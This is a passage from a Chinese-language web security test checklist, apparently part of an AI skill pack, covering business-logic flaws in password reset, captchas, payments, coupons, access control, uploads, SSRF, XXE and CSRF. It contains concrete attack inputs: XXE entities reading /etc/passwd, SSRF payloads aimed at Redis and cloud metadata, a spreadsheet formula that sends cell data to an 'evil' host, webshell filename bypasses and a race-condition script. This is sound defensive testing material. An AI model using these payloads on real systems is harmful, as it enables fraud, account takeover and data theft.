| 风控规则覆盖"多个相似虚拟账户批量下单"场景 | 风控只盯单账号或单一特征即被多账户绕过 | 注册 N 个不同邮箱但同设备/同 IP 的账号，并发执行薅羊毛动作看是否拦截 |
| 注册多步流程后端校验前置步骤实际完成 | 否则攻击者可直接 POST 最后一步绕过邮箱/手机验证 | 跑完一次正常注册抓所有请求，下次直接发"设置密码"那一步看是否成功 |

参考：逻辑漏洞checklist.pdf page_00004。

---

## 3. Password Recovery / 找回密码

| Item | why | verify |
|---|---|---|
| 重置 token 不可基于弱随机数 | `Windows rand()` max=32768 可枚举 | 看后端 token 生成是否 `md5(rand())`；本地 0~32768 全量字典爆破对照（逻辑漏洞checklist.pdf page_00011） |
| 重置 token 一次性 + 短时效 | 否则可重放 | 重置成功后再用同一 token 改另一个密码看是否仍接受 |
| 重置流程中"目标用户"由服务端 session 决定，不接受请求体替换 | 否则可改 user_id 重置他人密码 | 自己发起重置走到第 4 步时，把请求体里的 `user_id` 或 `email` 改成受害者，看能否成功 |
| 验证码与提交手机号强绑定 | 不绑定就可"用自己手机收码、改受害者手机号"完成重置 | 抓包改 `phone=victim`、`code=自己收的码` 看能否通过 |
| 改邮箱后旧重置 token 立即失效 | 否则可"先索 token → 改邮箱 → 用旧 token 接管" | 索一个 token，立即改邮箱再用旧 token，看是否还有效 |
| 修改后的链接绑定到当前会话/设备 | 否则可跨设备劫持重置 | 在桌面浏览器索 token，移动浏览器使用，看是否还能完成 |
| 找回流程内每一步都强校验"上一步是否真的通过"（状态机） | 否则可跳过验证步直接到改密 | 直接 POST 改密接口，不带验证步骤的标志位 |
| 短信验证码不能写在 Cookie / 响应包 | 8.逻辑漏洞.pdf page_00020 类问题 | 抓包搜索响应体 `"randm"`、`"verify_code"` |
| 重置 token 不可仅经 Base64 等可逆编码"假装加密" | 简单 decode 即得明文验证码 | 抓密码重置响应包，对疑似字段做 base64/url decode，得到明文则可直接重置 |
| 跨步骤令牌不可复用：邮箱验证 token 不能塞回手机验证步骤 | 后端只校验 token 合法不绑定步骤 | 步骤 A 拿到 reset_token，跳过 B/C，直接在 D（设新密码）传该 token 看是否成功 |
| 找回密码全流程数据包应做差异分析挖断点 | 不同用户/不同步骤的请求差异常暴露 token 生成规律 / 缺失校验字段 | 用 Burp Comparer 对比多次重置请求的 URL、POST 体，找时间戳 / UID / token 是否可预测 |
| 发现 reset_token / 验证码出现在 URL / HTML 源码 / JS 字符串里需高危处理 | 直接暴露在前端等于绕过认证 | grep 页面源码与 JS 文件搜 `token`、`code`、`answer`、`reset_id` 关键词 |

参考：逻辑漏洞checklist.pdf page_00004/00005/00011。

---

## 4. Captcha / 验证码模块

| Item | why | verify |
|---|---|---|
| 接口对 IP / 手机号 / 设备做单位时间频率限制 | 否则被短信轰炸 | 用 Burp Repeater 连发 100 次同一手机号请求，看是否仍每条都发 |
| 高并发下不能绕过频率限制 | 简单计数器有竞态 | 用 Burp Turbo Intruder `concurrentConnections=30` 同时发，看是否突破限频（8.逻辑漏洞.pdf page_00016） |
| 不依赖 Cookie / JSESSIONID 来记"已发送" | 删 cookie 即重置 | 抓包删 Cookie 后 replay 看是否能再次成功 |
| 手机号字段严格 trim + 长度校验 | `13888888888 ` (尾部空格)、`+86`、`/r/n` 等可绕过 | 提交 `phone=13888888888 `、`phone=8613888888888`、`phone=13888888888\r\n` 测试 |
| 拒绝超长手机号被网关自动截断 | `138888888889` 12 位被截前 11 位仍发出 | 抓包提交 12 位号码，看是否仍下发短信 |
| 验证码不可在响应里 echo | 8.逻辑漏洞.pdf page_00020 | 搜索响应体里是否包含与短信一致的数字 |
| 同一验证码不可多次使用 | 否则可重放 | 输入正确码，重复 submit N 次看是否成功 |
| 长度足够（建议 6 位+）防爆破 | 4 位纯数字 5 分钟可爆破完 | 用 Burp Intruder 0000~9999 全量爆破计算耗时 |
| 不存在"万能码"残留 | 8.逻辑漏洞.pdf page_00008 | 尝试 `000000`、`123456`、`888888`、`111111` |
| 删除 captcha 参数仍被拒绝 | 后端需强校验参数存在 | Burp 删除 `captcha=` 参数后 replay |
| 验证码与当前会话/账号上下文绑定，不接受跨账户复用 | 仅校验数值正确不绑会话即可借用 | 在 A 账户索取验证码，在 B 账户的下一步流程里填入 A 的码看是否通过 |
| 验证码使用一次后立即作废，不允许"用完未销毁仍可重放" | 一次性属性缺失即可重放完成多次操作 | 一次成功验证后再次提交相同验证码看是否仍接受 |
| 接收手机/邮箱参数不可被请求体改写为攻击者控制的地址 | 发送验证码接口未校验请求来源与接收者一致性 | 拦截"发送验证码"请求，把 `phone` / `email` 改为攻击者地址，发送后看是否在攻击者侧收到验证码 |

参考：8.逻辑漏洞.pdf page_00014~00023、逻辑漏洞checklist.pdf page_00007/00008/00009。

---

## 5. Payment / 支付与充值

| Item | why | verify |
|---|---|---|
| 服务端独立校验金额（不信任前端 `amount`/`total_price`） | 经典前端可控参数 | 抓包改 `amount=0.01`/`amount=-100`，看订单是否生效 |
| 支付状态由后端根据网关回调写，不接受客户端 `payment_status=paid` | 8.逻辑漏洞.pdf page_00005 | 改 `payment_status=paid`、`is_paid=1` 看订单是否被标记完成 |
| 数量字段必须为正整数 | `quantity:-1` / `quantity:0.02` 都构成漏洞 | `skuQty:0.02` (8.逻辑漏洞.pdf page_00011)、`FoodNum:0.01` (page_00012) |
| 数量字段做上限校验防整数溢出 | int32 max+1 = -2147483648 | 提交 `quantity=2147483648` 看是否回绕（8.逻辑漏洞.pdf page_00008） |
| 优惠券面值不能为负数或大于商品价 | `coupon_amount=-100` 反加；`coupon_amount > price` 直接 0 元 | 抓包修改 coupon 字段（8.逻辑漏洞.pdf page_00006） |
| 即使前端报"支付失败"，订单详情里 amount 必须等于商品价 | 订单可能已生成，再用站内钱包补支付 | 改券后看订单详情，尝试用钱包支付（8.逻辑漏洞.pdf page_00006） |
| 支付接口名 / 渠道走白名单校验 | 否则替换不存在接口可"成功" | 改 `payment_method=invalid_chan` 看响应（8.逻辑漏洞.pdf page_00007 0x05） |
| 试用接口与购买接口完全隔离 | 否则"试用 URL 改成购买"刷免费 VIP | 把 URL 末尾的 `4` (试用) 改 `3` (购买) 看是否仍归 0 元（8.逻辑漏洞.pdf page_00008 0x11） |
| 收款人 `username`/`account_id` 由服务端 session 决定 | 否则可替换为受害者扣他钱 | 改 `username=victim` 看是否扣他人余额（8.逻辑漏洞.pdf page_00008 0x10） |
| 充值金额精度不被四舍五入吃掉 | 0.019 元只扣 0.01 但钱包加 0.02 | 充 0.019 看实际扣款与钱包变化（8.逻辑漏洞.pdf page_00013） |
| 服务端用整数（分）而非浮点 | 浮点四舍五入是精度漏洞根源 | 看响应里金额是 `1.99`/`199` |
| 支付回调签名 + 时间戳 + 来源 IP 三重校验 | 否则可伪造成功通知 | 抓真实回调，本地伪造重发 |
| 回调接口幂等 | 否则重放可重复发货 | 同一回调请求重放 N 次，看订单状态变化 / 是否多次发货 |
| 支付完成后购物车锁定 | 否则可"支付完再加车，按新车发货" | 在支付页停留时返回另开标签加车，完成支付看实际发货 |
| 用户/订单替换攻击防护 | 多笔订单的支付通知应严格绑定 transaction_id | 同时下大额订单 + 小额订单，用小额支付通知去 confirm 大额 |
| 多设备并发签约不获新人优惠 | 服务端必须 lock 用户状态 | 多手机同时进新人优惠支付页，依次完成（逻辑漏洞checklist.pdf page_00012） |
| 限时活动用服务端时间，不信前端 timestamp | 否则改 time 绕过 | 改请求里 `time` 参数为活动外时间（逻辑漏洞checklist.pdf page_00013） |
| 关键字段服务端有签名 / HMAC，签名覆盖**所有**影响金额参数 | 否则未签名间接字段（数量、折扣）改了仍生效 | 对比正常 vs 篡改请求，找未签名字段（逻辑漏洞checklist.pdf page_00017） |
| 移动端不硬编码 RSA 私钥 / MD5 密钥 | 反编译可拿，伪造签名 | jadx 反编译 APK，搜 `md5`、`RSA`、`SecretKey` 字符串 |
| 货币代码 `currency` 与金额联动校验，不接受切换至低汇率币种 | 后端不重新换算汇率，直接按数字扣款 | 同一支付请求把 `currency=CNY` 改 `currency=JPY/RUB/INR`，保持 amount 数值不变看实际扣款金额 |
| 运费/手续费/优惠等"非商品金额"字段必须正数校验 | `shipping_fee=-500` 直接抹掉应付金额 | 拦截下单请求把运费 / 手续费 / 折扣字段改为负数，看订单总额是否被冲减 |
| 订单生成后的"编辑/换货/补差价"接口必须重新查询商品现价 | 否则可创建普通订单后改 SKU 为低价商品支付 | 生成订单 → 调编辑接口把商品 ID 改为低价商品 → 完成支付看实际扣款 |
| 退款 / 取消订单后所有虚拟权益（积分、VIP、服务、优惠券复用权）必须同步回收 | 业务闭环缺失，退款后已发放的权益不撤销 | 跑"购买 → 使用 → 退款"三步，检查积分余额、VIP 等级、优惠券状态是否复原 |
| 收款人 / 商家 / 提现账户字段由服务端 session 判定，不接受请求体替换 | 攻击者可改 receiver_account 把资金转入自己账户 | 拦截提现 / 转账请求改 `receiver_account` / `merchant_id` 字段，看资金去向 |
| 一次成功支付仅能触发一次发货 / 一次充值入账 | 缺幂等性的"模拟支付成功回调"可白嫖 N 次 | 抓真实支付成功的回调或确认请求，用 Burp Repeater 高频重放，看库存/余额是否多次变化 |
| 系统对"利润 0.001 元，但日调用 100 万次"类微利薅羊毛有总量风控 | 单次差额小但累积巨大 | 估算单次利差 + 接口频率 + 每日上限，做累积可获利测算 |

参考：8.逻辑漏洞.pdf page_00004 ~ 00013、逻辑漏洞checklist.pdf page_00002/00012/00013/00017/00018。

---

## 6. Coupons / Points / Gift Cards / 优惠券、积分、礼品卡

| Item | why | verify |
|---|---|---|
| 单券一次性 + 状态绑定订单 | 否则订单关闭后券仍在，重复使用 | 创建订单 → 关闭 → 重新下单看券是否仍可用（逻辑漏洞checklist.pdf page_00013） |
| 同一券不能并发应用到多个订单 | 竞态打 | Burp Repeater Group "Send in parallel" 提交 20 次相同 coupon 应用 |
| 券值范围严格校验 | 防 `value=-100`、`value=999999` | 抓包改面值 |
| 数组形式提交多张券会被拒 | `couponid[0]=A&couponid[1]=B` 是常见绕过 | 把请求改成数组形式（参见 SCENARIOS.md §6.1） |
| 积分抵扣值有上限且 ≥0 | 否则可负数反加积分 | 改 `points=-1000` |
| 邀请码不形成自循环 / 无限链 | 用 throwaway email 创号 → 互邀 → 无限返佣 | 创账号 A、B、C 互相填邀请码，看返佣是否到账 |
| 礼品卡 / 兑换码并发兑换被拒绝 | 双花经典场景 | Burp 并行重放兑换请求 |
| 抽奖次数 / 概率不可被前端控制 | 8.逻辑漏洞.pdf page_00009 类 | 抓包改 `chance_count`、`prize_id` |

参考：逻辑漏洞checklist.pdf page_00006/00013、SKILL.md §4。

---

## 7. Order / 订单与购物车

| Item | why | verify |
|---|---|---|
| 总金额服务端用单价×数量重算，不信任前端 `total` | 否则改 total 实付任意 | 抓包修改 `total_amount`，看实际扣款 |
| 数量为负 / 0 / 浮点都被拒绝 | 8.逻辑漏洞.pdf page_00011 / 00012 | `quantity=-1`、`quantity=0`、`quantity=0.02` |
| 库存为 0 / 接近 0 时正确并发处理 | 防超卖 | 多线程同时购买仅剩 1 件商品 |
| 订单状态机仅允许合法跳转 | 否则可 PUT `status=paid`/`refunded`/`shipped` 直接跳 | 直接调状态变更 API（参考 SKILL.md §6） |
| 不允许从已发货 / 已完成订单回退到待支付 | 否则可"取消已发货订单刷退款" | 试图改 status 倒退 |
| 订单 ID 不可枚举（UUID 而非自增） | 否则遍历可看他人订单 | 递增 `order_id=1..N` 看是否能拿别人订单数据 |
| 订单详情接口独立做归属校验（不只在 ID 上做） | IDOR | 用 A token 访问 B 的订单 ID |
| 同一订单不能并发提交支付 | 否则可双花 | 并发提交相同 cart_id 看是否生成多笔扣款单笔到账 |
| 退货/退款不能跳过商家审核 | 8.逻辑漏洞.pdf page_00009 | 直接调 refund API 不走审核 |
| 收货确认绑定真实收货地址 / 用户确认 | 否则可绕过自动确认 | 直接调 confirm-receipt 接口 |

参考：8.逻辑漏洞.pdf page_00009、逻辑漏洞checklist.pdf page_00015/00016。

---

## 8. IDOR / Privilege Escalation / 越权访问

| Item | why | verify |
|---|---|---|
| 所有 API 都走 Filter / 中间件统一鉴权（不只前端隐藏入口） | Java Web 常见缺陷：仅 Servlet 跳页面没有 Filter，所有非登录页面均可未授权访问 | 删 Cookie 直接访问 `/api/*` 看是否还能拿数据 |
| 资源 ID 必须做归属校验，不只校验"已登录" | 经典水平越权：登录后接口拿 ID 不做归属判断 | 用 A 账号访问 B 的 user_id 资源 |
| 角色字段（role/level）不可在 cookie / 请求体中可修改 | base64 cookie `uid=admin1` | 改 cookie 中 uid / role 字段后 replay |
| RBAC 数据一致性：UI 删除权限后数据库 sys_menu 不残留重复行 | 后端业务逻辑常见缺陷：sys_menu 重复行致权限取消未真正生效 | 取消用户某权限后查 sys_menu 表是否仍有该记录 |
| Cookie 替换不能拿到管理员数据 | 抓 admin Cookie 给普通用户用即越权，是经典 cookie 替换攻击 | 用 admin 抓包，普通账号 replay 用 admin Cookie |
| `/admin/*` 路径 Filter 用 `request.getServletPath()` 而非 `getRequestURI()` | `getRequestURI` 不规范化路径，分号截断后判定失效 | 试 `/admin/;/login` 是否绕过 |
| 路径中 `..//` 不能截断 Filter | `/FilterDemo/../../index.jsp` 截断绕过登录检查的经典 Servlet 缺陷 | 提交 `/admin/../../home`、`/admin/..%2F..%2F` 看响应 |
| 后台 URL 不暴露 / 不可枚举 | 后台入口直接命中（如 `main.php`）即未授权访问 | 试常见路径 `admin.php`、`/admin`、`/manage` |
| Spring Security 配置 antMatchers 覆盖完全 | `.antMatchers("/system/menu/**").hasRole("admin")` 仅匹配前缀，漏写接口路径即未授权 | grep `@PreAuthorize`、`@RequestMapping`，对照配置 |
| 所有"管理员可见数据"接口检查请求来源用户角色 | 防垂直越权 | 用 user token 调 admin API |
| 第三方 / 内部接口必须鉴权 | `/api/internal/*` 漏出来即未授权 | nmap / dirsearch 探内部接口 |
| Host 碰撞下不暴露内部资产 | 8、2022 第 20 段：`host_scan.py` 碰撞出注入/上传/越权 | `python3 host_scan.py -d target.com -t 100` |
| 邮箱 / 手机更换接口必须先验证旧绑定凭证（旧密码 / 旧邮箱验证码 / 旧手机验证码） | 跳过原校验直接 `new_email=attacker` 即接管账号 | 拦截"更换邮箱/手机"请求，移除旧凭证字段或留空，看是否仍允许变更 |
| UID 与 session token 一致性校验：禁止 token 属于 A、请求体里 uid=B | 后端只看 uid 不看 token 归属即横向越权 | 保持 A 的 Cookie/Token 不变，把请求体里的 `uid` 改为 B，看是否返回 B 的数据 |
| 多端入口（Web、App、小程序、对外开放 API）权限策略一致 | Web 拦截 / App 不拦截 = 替代入口绕过 | 同一受限功能在不同端分别测试，比对权限校验是否一致 |
| 群组 / 社交管理操作（踢人、禁言、置顶）服务端校验"操作者身份与目标对象关系" | 否则可修改 target_uid 操作非本群成员或群主 | 拦截踢人请求把 `target_uid` 改为群主或非本群成员的 ID 看是否成功执行 |
| 升级/降级权益时新旧角色权限完整切换，无残留 RBAC 数据 | 角色更新逻辑只新增不删除即权限污染 | 用户从 admin 降为 user 后立即调用管理 API，看是否仍能调用 |
| 隐藏分享链接 ID / 礼物 ID / 活动 ID 必须随机化或带访问 ACL | 数字递增可遍历他人隐私行程或资源 | 拿到一个合法 ID，用 Intruder 数字递增枚举附近 ID 看是否能拿其他用户数据 |

参考：Java Web Filter / Spring Security 鉴权常见缺陷模式（详细可在 SCENARIOS.md 中扩展）。

---

## 9. Real-Name & Privacy / 实名认证、隐私合规

| Item | why | verify |
|---|---|---|
| 实名认证后认证状态锁定，不可"故意填错驳回再修改" | 8.逻辑漏洞.pdf page_00029：故意填错身份证 → 驳回 → 重置入口 | 用错误身份证提交认证，被驳回后看是否还能改身份信息 |
| 提交错误身份证 N 次自动锁定或人工审核 | 否则可重放绕过防沉迷 | 连续 5 次提交不同错误身份证看是否被风控 |
| 服务端响应不能信前端 success 字段 | 8.逻辑漏洞.pdf page_00022/00023：改 `success:true` 绕过密码校验换绑手机号 | Burp 改响应 `success:false → true` 看前端流程是否放行 |
| 修改手机号 / 邮箱前必须验证旧凭证（密码或旧手机验证码） | 漏校验直接接管 | 不带验证字段直接 POST 修改接口 |
| 个人资料字段不可越权修改他人 | 改 user_id 改别人资料 | 抓包改 `user_id=victim` 看是否成功 |
| 头像 / 文件上传严格类型校验 + 沙箱 | 防 webshell + XXE | 上传 `.php`/`.jsp`、上传含 `<!ENTITY>` 的 docx |
| 数据脱敏跨接口一致 | 8.逻辑漏洞.pdf 案例：A 显 `138****5678`，B 显 `1384***5678`，C 显 `13845**678`，组合可还原 | 列出所有泄露同一字段的接口对比掩码方式 |
| 敏感字段不在响应里全量返回 | 用户信息查询返回 password / id_card 全文 | 抓登录 / 个人中心查询响应，搜 `password`、`身份证` |
| 接口枚举有频率限制 + 行为分析 | 防身份证号爆破（8.逻辑漏洞.pdf page_00027 不同状态码 501/531 暴露有效性） | Burp 用递增身份证号枚举，看响应差异（length/code） |

参考：8.逻辑漏洞.pdf page_00022/00023/00027/00028/00029/00030。

---

## 10. VIP / Subscription / Resource Access / 付费内容

| Item | why | verify |
|---|---|---|
| 资源链接（视频/音频/课程文件）必须服务端鉴权，不能在响应里给直链 | 8.逻辑漏洞.pdf page_00031/00032/00033：抓包发现 `previewPullUrl: ...flv` 直链下载 VIP 资源 | 抓详情接口响应，搜 `.flv`、`.mp4`、`.m3u8`、`url`，复制到 VLC 或 flv.js demo 播放 |
| 替换免费课程 ID 为付费课程 ID 不可绕过付费校验 | IDOR 经典场景 | 抓免费课程接口，把 ID 替换为付费课程 ID 看是否同样返回内容 |
| 直链带短期签名 + Referer + IP 校验 | 单纯链接公开仍可被分享 | 复制链接到无 Referer 环境（curl）看是否能下载 |
| VIP 时长升级支持幂等防重 | 多端并发补差价升级被锁（逻辑漏洞checklist.pdf page_00012） | 多设备同时点"补差价升级"完成支付看 VIP 时长是否多倍叠加 |
| 试用 → 购买流程隔离 | 试用接口换接口号即获购买（8.逻辑漏洞.pdf page_00008） | URL 末尾 `/4` 改 `/3` 看是否仍按试用价 |
| 降级会员后高级 API 立即拒绝 | UI 隐藏≠后端拒绝 | 升级后调用高级接口 OK，降级后立即调用，看是否仍 200 |
| VIP 等级字段不可在请求体改 | `vip_level=99` 改 cookie 或请求体 | 抓包修改对应字段 |

参考：8.逻辑漏洞.pdf page_00031~00033、逻辑漏洞checklist.pdf page_00012。

---

## 11. URL Redirect / SSO / 第三方系统

| Item | why | verify |
|---|---|---|
| 跳转参数走白名单或仅 path | 否则任意 URL 跳转钓鱼 | `?url=https://evil.com` 看是否跳转 |
| 校验需覆盖编码绕过 | `?`、`@`、`/`、`#`、子域名、畸形 URL、IP 直连等多种手法（逻辑漏洞checklist.pdf page_00015） | 提交 `https://target.com@evil.com`、`https://target.com.evil.com`、`https://evil.com/?target.com`、`https://evil.com#target.com`、`https://[::1]/`、`https://0x7f000001/` |
| OAuth 回调地址绑定到客户端而非用户输入 | 否则任意回调可拿 token | 改 `redirect_uri=evil.com` 看是否颁发 |
| Webhook 回调签名 + 时间戳 + IP 白名单 | 否则可伪造支付/订阅事件 | 本地伪造回调直接 POST 给 `/webhook/*` |
| 第三方账户接口未授权 | 逻辑漏洞checklist.pdf page_00007 第三方系统未授权 | 删 cookie 访问 /third/api/* |
| 第三方应用版本无已知 CVE | 老版本组件 | wappalyzer / banner grab 看版本 |

参考：逻辑漏洞checklist.pdf page_00007/00014/00015。

---

## 12. Cookie / Token / Session

| Item | why | verify |
|---|---|---|
| Cookie 设 `HttpOnly`、`Secure`、`SameSite=Lax+` | 防 XSS 偷 cookie | DevTools 看 Cookie attributes |
| Token 不可预测 / 不可枚举（建议 ≥128 bit 随机） | 弱随机即可枚举 | 拿到多个 token，对比是否有规律（自增 / 时间戳 + 短盐） |
| Token 有合理过期时间 + 单设备 / 单端绑定 | 否则一次盗到永久控权 | 登录后 7 天再用同 token 试，或多端登录看是否互踢 |
| 改密码后所有旧 token 立即失效 | 否则改密无意义 | 在 A 设备登录，B 设备改密，看 A 是否被踢 |
| Cookie 不放业务关键状态字段 | 别把 `is_paid=1` 写 cookie | 抓 cookie 看是否含 `role`/`is_paid`/`vip` |
| 改 cookie 字段不能影响权限 | 8.逻辑漏洞.pdf page_00017 类问题 | 改 `JSESSIONID`、`uid` 后看响应变化 |
| 重置 cookie 不会重置服务端验证码计数 | 否则删 cookie 即解封 | 删 cookie 重新请求验证码看是否再次成功（8.逻辑漏洞.pdf page_00017） |
| Token 不可由客户端可控信息（用户名 + 时间戳）通过弱算法生成 | `md5(username+timestamp)` 这类是经典伪造点 | 抓多个不同账户/时间的 token，本地用同算法生成，替换后访问受保护资源看是否成功 |
| 退出登录 / 修改密码 / 更换绑定后旧 token 在 5 秒内全局失效 | 否则失效凭证仍可调敏感接口 | 旧设备发起请求 → 新设备退出 → 旧设备再次发起，看是否被拒绝 |
| 一次性 token / nonce / CSRF token 在第一次成功使用后立即作废 | 没作废即可重放敏感操作 | 抓含一次性 token 的请求一次性提交两次看第二次是否被拒 |
| Token 跨设备 / 跨 IP 使用时触发风控（异常登录提醒或强制重新认证） | 没绑定上下文即偷到 token 全球可用 | 用 A 设备登录拿到 Token，B 设备/不同 IP/不同 UA 用同 token 调敏感接口看是否拒绝 |

参考：逻辑漏洞checklist.pdf page_00011、SCENARIOS.md §5.3。

---

## 13. Race Condition / 并发竞态（横向 cross-cut）

> 凡是上面 checklist 出现"单次成功"的攻击，都要再问一遍：**并发是否能突破？**

| 场景 | 测试方式 |
|------|--------|
| 优惠券一次性 | Repeater Group `Send in parallel` 同时应用 20 次 |
| 礼品卡余额扣减 | Turbo Intruder concurrentConnections=30 |
| 限购"每人一份" | 多账号 / 多 IP 同时领 |
| 限频短信验证码 | 8.逻辑漏洞.pdf page_00016 案例：concurrentConnections=30, requestsPerConnection=10 |
| 多端并发会员升级 | 逻辑漏洞checklist.pdf page_00012 |
| 同邮箱并发注册 | 期望"唯一性约束生效"，否则双账号 |
| 同 cart 并发结账 | 双花 |

参考脚本：

```python
# Burp Turbo Intruder template
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```

---

## 14. Comment / Third-Party Inputs / 评论与外部输入

| Item | why | verify |
|---|---|---|
| 评论字段做参数化 SQL + XSS 过滤 | POST/Cookie 注入 + 评论 XSS | 提交 `'`、`<script>` |
| 评论需 token / session 校验防 CSRF | 否则可伪造评论 | 删除 referer / token 后提交 |
| 不可遍历评论用户 ID 拿用户信息 | IDOR | 改 `userid=N` 看是否泄露 |
| 评论速率限制 + 风控 | 防刷评 | 高频提交看是否拦截 |

参考：逻辑漏洞checklist.pdf page_00007。

---

## 16. File Upload / 文件上传业务逻辑

> 仅针对"上传业务"自身的逻辑校验。Webshell / 解析漏洞 / 敏感文件读取等通用利用链请同时加载 `upload-insecure-files/SKILL.md`。

| Item | why | verify |
|---|---|---|
| 上传文件以"文件签名/魔术字"为准，不依赖 `Content-Type` 与扩展名 | 仅检查 MIME / 扩展名可被改包绕过 | 拦截上传请求，把 `Content-Type` 改 `image/jpeg`，body 是 PHP 内容，看是否上传成功且能解析执行 |
| 扩展名校验拒绝双扩展、大小写混合、点号截断、`;` 截断、空字节 | `.php.jpg`、`.Php`、`.php.`、`.php;.jpg`、`.php\x00.jpg` 均常见绕过 | 用 `shell.php.jpg` / `shell.Php` / `shell.php%00.jpg` / `shell.php;a=1` 各跑一发 |
| 文件名做规范化，禁止 `..` / 绝对路径 / 控制字符 | `filename=../../webshell.php` 写到根目录 | 拦截上传请求把 `filename` 改 `../../webshell.php` 看落地路径 |
| 上传文件落地路径不可被前端字段控制 | 否则直接覆盖任意路径文件 | 抓包看请求是否含 `path` / `dir` / `category` 字段，尝试改为业务外路径 |
| 上传文件存储路径不可枚举或跨用户覆盖 | `/uploads/UID/filename` 知道 UID 即可命中 | 用 A 上传 `a.png`，用 B 用相同文件名上传，看是否覆盖 A 或写入 A 路径 |
| 服务端解析 / 转换图片走沙箱并控版本 | ImageMagick / FFmpeg / Pillow 都有 RCE 历史 | 上传含恶意 EXIF / payload 的 JPG 触发已知 CVE，看服务端反应 |
| Office / OOXML / PDF 上传必须重打包检测：xml 合法性 + 危险节点（DDE、宏、外部链接）剥离 | docx 实质 ZIP，重打包注入恶意 XML 即绕过表面校验 | 解压 `.docx` 改 `[Content_Types].xml` 注入外部实体 / DDE 后重打包上传 |
| XML / DTD / SVG 上传走专用解析器禁用外部实体 | 否则就是 XXE 上传 | 上传含 `<!ENTITY x SYSTEM "file:///etc/passwd">` 的 SVG / docx 看响应或带外日志 |
| 解压缩接口必须限制单文件展开后大小与 zip-bomb | 1KB → 1GB DoS | 上传一个 `42.zip` 类压缩炸弹，监控服务端 CPU/磁盘 |
| CSV / XLSX 内容做公式注入过滤 (=, +, -, @ 开头) | `=SYSTEM("calc")` 在 Excel 宏环境执行 | 提交 `=cmd|'/c calc'!A1`、`=HYPERLINK("http://evil/?"&A1, "click")` 看下载方实际表现 |
| 高并发上传不存在"上传中"窗口，可绕过病毒扫描或清理 | 高并发下 AV 来不及扫，恶意文件短暂可访问 | 用 Burp Intruder 并发上传同一恶意文件并并发请求该 URL，看是否抓到执行窗口 |
| 上传接口同样受频率限制和身份验证 | 内网/后台上传是 webshell 主路径 | 删 cookie / 用低权限账号尝试上传，看是否拒绝 |

参考：SKILL.md §11.8、`upload-insecure-files` skill。

---

## 17. CSRF / SSRF / XXE / Out-of-Band / 网络层逻辑

| Item | why | verify |
|---|---|---|
| XML 解析器禁用外部实体 / DTD 加载 / 参数实体 | 否则一行 `<!ENTITY x SYSTEM "file:///etc/passwd">` 即任意文件读取 | Body 注入含 `<!DOCTYPE>` 与 `SYSTEM` 实体的 XML，看响应是否回显 `/etc/passwd` |
| XXE 盲注：响应不回显时仍走带外通道排查 | 不回显 ≠ 不存在；OOB 仍可窃数据 | 在 Burp Collaborator / DNSLog 配 DTD，构造参数实体 → 监听是否收到目标外联 |
| 任意"导入 URL / 拉取图片 / Webhook 回调 / 预览链接"接口禁用 `file://` / `gopher://` / `dict://` / `jar://` / `php://` 协议 | 否则 SSRF 全套：读本地文件、攻击内网、命令执行 | 把 URL 改 `file:///etc/passwd`、`gopher://127.0.0.1:6379/_FLUSHALL`、`http://169.254.169.254/`，看响应或带外 |
| URL 输入做"DNS resolve + 解析后再校验"，禁止解析到内网 IP / 保留段 | 仅匹配字符串可被 DNS rebind 或 `127.0.0.1.nip.io` 绕过 | 用 `http://attacker.tld`（A 记录指向 169.254.169.254）发 SSRF，重定向到内网看是否打通 |
| 重定向跟随的 URL 同样走 SSRF 校验，不能"首跳合法→302→内网" | 多数 SSRF 通过 302 跳板成立 | 攻击者域名返回 `302 Location: http://127.0.0.1:8500/`，看目标是否跟随 |
| 状态变更接口（支付、提现、改密、改邮箱、删数据）有 Anti-CSRF Token + SameSite + Origin/Referer 三重 | 缺一即可被恶意页面静默触发 | 写一个 attacker.html 含自动提交 form 指向目标接口，浏览器登录后访问看是否触发 |
| Webhook / 支付回调 / 第三方通知接口校验签名 + 时间戳 + 来源 IP 白名单 | 否则可本地伪造支付成功通知 | 抓真实回调请求，本地修改订单号/金额后直接 POST 给回调 URL，看订单状态 |
| JSONP 回调与跨域读接口不返回敏感用户数据 | JSONP 即可被跨域 `<script>` 拉取 → 绕过 SOP | 在 attacker 页面用 `<script src="https://target/api/jsonp?cb=x">`，看是否能拿到 user 数据 |
| 出网请求出口走"白名单 + 出口防火墙"策略 | 内部资产可被打到云元数据 / 内网中间件 | 用 `http://169.254.169.254/latest/meta-data/`（AWS）/ `http://metadata.google.internal/` 探云元数据 |
| 盲注类漏洞日常排查标配带外平台（DNSLog / Collaborator / interactsh） | 单纯靠回显遗漏盲点 | 注入 payload 嵌入随机子域名，监控该域名是否被解析 |

参考：SKILL.md §11.9。

---

## 15. Methodology summary / 复测节奏

每个项目最少跑两轮：

1. **第一轮**：从上到下完整跑 0~14 节，每条都试一下，无脑勾选。
2. **第二轮**：把第一轮挂红的（疑似漏洞）拿到 [METHODOLOGY.md §6.1 三个追问](./METHODOLOGY.md) 复盘，每条跑业务侧验证（看 VIP 真增加了吗？钱真扣别人的吗？数据真返了不该返的吗？）。

报告时按"业务影响 > 技术细节"排序：财损 / 接管 / 隐私泄露 → 越权 / 信息泄露 → DoS / UX 缺陷。

---

## References / 参考

- [METHODOLOGY.md](./METHODOLOGY.md) — 五阶段方法论 / 单页决策树
- [SKILL.md](./SKILL.md) — 业务逻辑漏洞 attack playbook
- [SCENARIOS.md](./SCENARIOS.md) — 支付/竞态/找回密码/枚举/上传细化场景
- 蒸馏原始素材（外部）：业务逻辑漏洞 PDF 教材 / 业务逻辑漏洞 checklist 教材 / 业务逻辑漏洞审计课程录像 / 2022 业务逻辑漏洞专题课程


---
# Part 3: Business Logic Methodology


## 0. Why this methodology / 为什么不是直接套 checklist

业务逻辑漏洞通常具有以下四个特征：

- **黑盒难发现**：规律性弱、条件苛刻（依赖会话 Cookie、特定登录态、特定业务流转），扫描器几乎无效。
- **必须人工**：每一类漏洞都强耦合于具体业务（支付、退款、注册、抽奖），换一个系统几乎要从零理解。
- **代码审计痛但有效**：黑盒覆盖不到所有 API；只看代码又脱离业务；必须双管齐下。
- **看到现象只是开始**：单个 200/302/`success:true` 不能说明问题，要回到业务上去推"它是不是本来就该这样"。

因此本方法论的核心是 **5 个阶段 + 1 张索引表**，每个阶段都给出"该做什么 / 不该做什么 / 看到什么算异常"。


## 1. Five-Phase Workflow / 五阶段工作流

```
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 1: Business Modeling                                       │
